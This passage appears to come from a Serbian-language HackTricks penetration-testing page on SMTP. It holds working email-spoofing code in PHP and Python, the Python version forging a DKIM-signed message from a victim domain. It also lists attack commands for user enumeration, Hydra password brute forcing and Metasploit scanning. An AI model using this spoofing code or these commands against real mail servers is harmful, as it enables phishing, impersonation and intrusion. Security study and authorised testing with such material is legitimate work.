koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
```
{% endhint %}

**Ili možete to uraditi ručno:**

{% tabs %}
{% tab title="PHP" %}
<pre class="language-php"><code class="lang-php"><strong># Ovo će poslati nepotpisanu poruku
</strong><strong>mail("your_email@gmail.com", "Test Subject!", "hey! Ovo je test", "From: administrator@victim.com");
</strong></code></pre>
{% endtab %}

{% tab title="Python" %}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{% endtab %}
{% endtabs %}

### **Više informacija**

**Pronađite više informacija o ovim zaštitama na** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **Drugi indikatori phishinga**

* Starost domena
* Linkovi koji upućuju na IP adrese
* Tehnike manipulacije linkovima
* Sumnjivi (neobični) prilozi
* Oštećen sadržaj e-pošte
* Korišćenje vrednosti koje se razlikuju od zaglavlja e-pošte
* Postojanje važećeg i pouzdanog SSL sertifikata
* Slanje stranice na sajtove za filtriranje web sadržaja

## Izvlačenje podataka putem SMTP-a

**Ako možete slati podatke putem SMTP-a** [**pročitajte ovo**](../../generic-methodologies-and-resources/exfiltration.md#smtp)**.**

## Konfiguracioni fajl

### Postfix

Obično, ako je instaliran, u `/etc/postfix/master.cf` se nalaze **skripte za izvršavanje** kada se, na primer, primi nova pošta od korisnika. Na primer, linija `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` znači da će se izvršiti `/etc/postfix/filtering` ako korisnik mark primi novu poštu.

Drugi konfiguracioni fajlovi:
```
sendmail.cf
submit.cf
```
## Reference
* [https://research.nccgroup.com/2015/06/10/tehnike-za-nabrojavanje-korisnickih-imena-i-njihova-vrednost/](https://research.nccgroup.com/2015/06/10/tehnike-za-nabrojavanje-korisnickih-imena-i-njihova-vrednost/)
* [https://www.reddit.com/r/HowToHack/comments/101it4u/sta_bi_haker_mogao_uraditi_sa_neispravno_konfigurisanim_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/sta_bi_haker_mogao_uraditi_sa_neispravno_konfigurisanim_smtp/)

## HackTricks Automatske Komande
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Odmah dostupna postavka za procenu ranjivosti i testiranje prodiranja**. Pokrenite puni pentest bilo odakle sa više od 20 alata i funkcija koje idu od rekonstrukcije do izveštavanja. Mi ne zamenjujemo pentestere - mi razvijamo prilagođene alate, module za otkrivanje i eksploataciju kako bismo im vratili neko vreme da dublje kopaju, otvaraju ljuske i zabavljaju se.

{% embed url="https://pentest-tools.com/" %}
<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
